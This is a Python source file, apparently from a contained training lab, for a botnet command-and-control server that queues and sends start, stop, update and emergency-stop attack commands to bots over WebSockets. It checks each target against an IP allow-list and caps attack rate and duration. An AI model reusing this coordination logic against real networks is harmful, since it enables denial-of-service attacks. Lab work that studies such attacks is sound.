"""
Command handling and distribution system for the C2 server.
"""
import asyncio
import json
import logging
from datetime import datetime
from typing import Dict, List, Optional, Set
from enum import Enum

from shared.models import CommandMessage, AttackConfig, BotClient
from shared.config import LabConfig


class CommandType(str, Enum):
    """Available command types."""
    START_ATTACK = "start_attack"
    STOP_ATTACK = "stop_attack"
    UPDATE_ATTACK = "update_attack"
    HEARTBEAT_REQUEST = "heartbeat_request"
    STATUS_REQUEST = "status_request"
    DISCONNECT = "disconnect"
    EMERGENCY_STOP = "emergency_stop"


class CommandStatus(str, Enum):
    """Command execution status."""
    PENDING = "pending"
    SENT = "sent"
    ACKNOWLEDGED = "acknowledged"
    COMPLETED = "completed"
    FAILED = "failed"
    TIMEOUT = "timeout"


class CommandExecution:
    """Represents a command execution instance."""
    
    def __init__(self, command: CommandMessage, target_bots: List[str]):
        self.command = command
        self.target_bots = set(target_bots)
        self.sent_to: Set[str] = set()
        self.acknowledged_by: Set[str] = set()
        self.completed_by: Set[str] = set()
        self.failed_by: Set[str] = set()
        self.created_at = datetime.now()
        self.status = CommandStatus.PENDING
    
    def mark_sent(self, bot_id: str):
        """Mark command as sent to a bot."""
        self.sent_to.add(bot_id)
        if len(self.sent_to) == len(self.target_bots):
            self.status = CommandStatus.SENT
    
    def mark_acknowledged(self, bot_id: str):
        """Mark command as acknowledged by a bot."""
        self.acknowledged_by.add(bot_id)
        if len(self.acknowledged_by) == len(self.target_bots):
            self.status = CommandStatus.ACKNOWLEDGED
    
    def mark_completed(self, bot_id: str):
        """Mark command as completed by a bot."""
        self.completed_by.add(bot_id)
        if len(self.completed_by) == len(self.target_bots):
            self.status = CommandStatus.COMPLETED
    
    def mark_failed(self, bot_id: str):
        """Mark command as failed for a bot."""
        self.failed_by.add(bot_id)
        # If any bot fails, consider checking if we should mark as failed
        # For now, we'll let individual bot failures be tracked separately
    
    def get_progress(self) -> dict:
        """Get command execution progress."""
        return {
            "command_id": id(self.command),
            "command_type": self.command.command,
            "status": self.status.value,
            "target_bots": len(self.target_bots),
            "sent_to": len(self.sent_to),
            "acknowledged_by": len(self.acknowledged_by),
            "completed_by": len(self.completed_by),
            "failed_by": len(self.failed_by),
            "created_at": self.created_at.isoformat(),
            "target_bot_ids": list(self.target_bots),
            "sent_to_ids": list(self.sent_to),
            "acknowledged_by_ids": list(self.acknowledged_by),
            "completed_by_ids": list(self.completed_by),
            "failed_by_ids": list(self.failed_by)
        }


class CommandQueue:
    """Queue for managing command execution."""
    
    def __init__(self, max_size: int = 100):
        self.max_size = max_size
        self.queue: asyncio.Queue = asyncio.Queue(maxsize=max_size)
        self.active_commands: Dict[str, CommandExecution] = {}
        self.command_history: List[CommandExecution] = []
        self.logger = logging.getLogger(__name__)
    
    async def enqueue_command(self, command: CommandMessage, target_bots: List[str]) -> str:
        """Enqueue a command for execution."""
        try:
            execution = CommandExecution(command, target_bots)
            command_id = str(id(execution))
            
            # Add to active commands
            self.active_commands[command_id] = execution
            
            # Add to queue
            await self.queue.put((command_id, execution))
            
            self.logger.info(f"Command enqueued: {command.command} for {len(target_bots)} bots")
            return command_id
        
        except asyncio.QueueFull:
            self.logger.error("Command queue is full")
            raise Exception("Command queue is full")
    
    async def get_next_command(self) -> Optional[tuple]:
        """Get the next command from the queue."""
        try:
            return await self.queue.get()
        except Exception as e:
            self.logger.error(f"Error getting next command: {e}")
            return None
    
    def mark_command_sent(self, command_id: str, bot_id: str):
        """Mark a command as sent to a bot."""
        if command_id in self.active_commands:
            self.active_commands[command_id].mark_sent(bot_id)
    
    def mark_command_acknowledged(self, command_id: str, bot_id: str):
        """Mark a command as acknowledged by a bot."""
        if command_id in self.active_commands:
            self.active_commands[command_id].mark_acknowledged(bot_id)
    
    def mark_command_completed(self, command_id: str, bot_id: str):
        """Mark a command as completed by a bot."""
        if command_id in self.active_commands:
            execution = self.active_commands[command_id]
            execution.mark_completed(bot_id)
            
            # If command is fully completed, move to history
            if execution.status == CommandStatus.COMPLETED:
                self.command_history.append(execution)
                del self.active_commands[command_id]
                
                # Limit history size
                if len(self.command_history) > self.max_size:
                    self.command_history = self.command_history[-self.max_size:]
    
    def mark_command_failed(self, command_id: str, bot_id: str):
        """Mark a command as failed for a bot."""
        if command_id in self.active_commands:
            self.active_commands[command_id].mark_failed(bot_id)
    
    def get_command_status(self, command_id: str) -> Optional[dict]:
        """Get the status of a command."""
        if command_id in self.active_commands:
            return self.active_commands[command_id].get_progress()
        
        # Check history
        for execution in self.command_history:
            if str(id(execution)) == command_id:
                return execution.get_progress()
        
        return None
    
    def get_active_commands(self) -> List[dict]:
        """Get all active commands."""
        return [execution.get_progress() for execution in self.active_commands.values()]


class CommandDistributor:
    """Handles command distribution to bots."""
    
    def __init__(self, config: LabConfig):
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.command_queue = CommandQueue()
        self.running = False
        self.distribution_task: Optional[asyncio.Task] = None
        
        # Command validation rules
        self.command_validators = {
            CommandType.START_ATTACK: self._validate_start_attack,
            CommandType.STOP_ATTACK: self._validate_stop_attack,
            CommandType.UPDATE_ATTACK: self._validate_update_attack,
            CommandType.EMERGENCY_STOP: self._validate_emergency_stop,
        }
    
    async def start(self):
        """Start the command distributor."""
        self.running = True
        self.distribution_task = asyncio.create_task(self._distribution_worker())
        self.logger.info("Command distributor started")
    
    async def stop(self):
        """Stop the command distributor."""
        self.running = False
        
        if self.distribution_task:
            self.distribution_task.cancel()
            try:
                await self.distribution_task
            except asyncio.CancelledError:
                pass
        
        self.logger.info("Command distributor stopped")
    
    async def distribute_command(
        self, 
        command: CommandMessage, 
        target_bots: List[str],
        bot_websockets: Dict[str, any]
    ) -> str:
        """Distribute a command to target bots."""
        try:
            # Validate command
            if not self._validate_command(command):
                raise ValueError(f"Invalid command: {command.command}")
            
            # Filter target bots to only include connected ones
            connected_bots = [bot_id for bot_id in target_bots if bot_id in bot_websockets]
            
            if not connected_bots:
                raise ValueError("No connected bots available for command")
            
            # Enqueue command
            command_id = await self.command_queue.enqueue_command(command, connected_bots)
            
            # Send command immediately to all connected bots
            await self._send_command_to_bots(command_id, command, connected_bots, bot_websockets)
            
            return command_id
        
        except Exception as e:
            self.logger.error(f"Error distributing command: {e}")
            raise
    
    async def _send_command_to_bots(
        self, 
        command_id: str, 
        command: CommandMessage, 
        target_bots: List[str],
        bot_websockets: Dict[str, any]
    ):
        """Send command to specific bots."""
        message = {
            "type": "command",
            "command_id": command_id,
            "data": command.dict()
        }
        
        message_json = json.dumps(message)
        
        for bot_id in target_bots:
            try:
                if bot_id in bot_websockets:
                    websocket = bot_websockets[bot_id]
                    await websocket.send_text(message_json)
                    self.command_queue.mark_command_sent(command_id, bot_id)
                    self.logger.debug(f"Command {command_id} sent to bot {bot_id}")
                else:
                    self.logger.warning(f"No WebSocket connection for bot {bot_id}")
                    self.command_queue.mark_command_failed(command_id, bot_id)
            
            except Exception as e:
                self.logger.error(f"Failed to send command to bot {bot_id}: {e}")
                self.command_queue.mark_command_failed(command_id, bot_id)
    
    async def handle_command_response(self, bot_id: str, response: dict):
        """Handle command response from a bot."""
        try:
            command_id = response.get("command_id")
            response_type = response.get("type")
            
            if not command_id:
                self.logger.warning(f"Command response from bot {bot_id} missing command_id")
                return
            
            if response_type == "command_acknowledged":
                self.command_queue.mark_command_acknowledged(command_id, bot_id)
                self.logger.debug(f"Command {command_id} acknowledged by bot {bot_id}")
            
            elif response_type == "command_completed":
                self.command_queue.mark_command_completed(command_id, bot_id)
                self.logger.info(f"Command {command_id} completed by bot {bot_id}")
            
            elif response_type == "command_failed":
                error_msg = response.get("error", "Unknown error")
                self.command_queue.mark_command_failed(command_id, bot_id)
                self.logger.error(f"Command {command_id} failed on bot {bot_id}: {error_msg}")
            
            else:
                self.logger.warning(f"Unknown command response type from bot {bot_id}: {response_type}")
        
        except Exception as e:
            self.logger.error(f"Error handling command response from bot {bot_id}: {e}")
    
    def _validate_command(self, command: CommandMessage) -> bool:
        """Validate a command before distribution."""
        try:
            # Check if command type is valid
            if command.command not in [cmd.value for cmd in CommandType]:
                self.logger.error(f"Invalid command type: {command.command}")
                return False
            
            # Run specific validator if available
            validator = self.command_validators.get(CommandType(command.command))
            if validator:
                return validator(command)
            
            return True
        
        except Exception as e:
            self.logger.error(f"Error validating command: {e}")
            return False
    
    def _validate_start_attack(self, command: CommandMessage) -> bool:
        """Validate start attack command."""
        if not command.attack_config:
            self.logger.error("Start attack command missing attack configuration")
            return False
        
        config = command.attack_config
        
        # Validate target IP
        if not self.config.network.is_ip_allowed(config.target_ip):
            self.logger.error(f"Target IP {config.target_ip} not allowed")
            return False
        
        # Validate intensity
        if config.intensity > self.config.safety.max_requests_per_second_per_bot:
            self.logger.error(f"Attack intensity {config.intensity} exceeds limit")
            return False
        
        # Validate duration
        if config.duration > self.config.safety.max_attack_duration:
            self.logger.error(f"Attack duration {config.duration} exceeds limit")
            return False
        
        return True
    
    def _validate_stop_attack(self, command: CommandMessage) -> bool:
        """Validate stop attack command."""
        return True  # Stop attack commands are always valid
    
    def _validate_update_attack(self, command: CommandMessage) -> bool:
        """Validate update attack command."""
        # Similar validation to start attack
        return self._validate_start_attack(command)
    
    def _validate_emergency_stop(self, command: CommandMessage) -> bool:
        """Validate emergency stop command."""
        return True  # Emergency stop commands are always valid
    
    async def _distribution_worker(self):
        """Background worker for command distribution."""
        while self.running:
            try:
                # This could be used for retry logic or delayed commands
                # For now, we handle distribution immediately in distribute_command
                await asyncio.sleep(1)
            
            except asyncio.CancelledError:
                break
            except Exception as e:
                self.logger.error(f"Error in distribution worker: {e}")
                await asyncio.sleep(5)
    
    def get_command_status(self, command_id: str) -> Optional[dict]:
        """Get the status of a command."""
        return self.command_queue.get_command_status(command_id)
    
    def get_active_commands(self) -> List[dict]:
        """Get all active commands."""
        return self.command_queue.get_active_commands()
    
    async def emergency_stop_all(self, bot_websockets: Dict[str, any]) -> str:
        """Send emergency stop command to all connected bots."""
        try:
            emergency_command = CommandMessage(
                command=CommandType.EMERGENCY_STOP.value,
                timestamp=datetime.now()
            )
            
            connected_bots = list(bot_websockets.keys())
            
            if not connected_bots:
                self.logger.warning("No connected bots for emergency stop")
                return ""
            
            command_id = await self.distribute_command(
                emergency_command,
                connected_bots,
                bot_websockets
            )
            
            self.logger.critical(f"Emergency stop command {command_id} sent to all bots")
            return command_id
        
        except Exception as e:
            self.logger.error(f"Error sending emergency stop: {e}")
            raise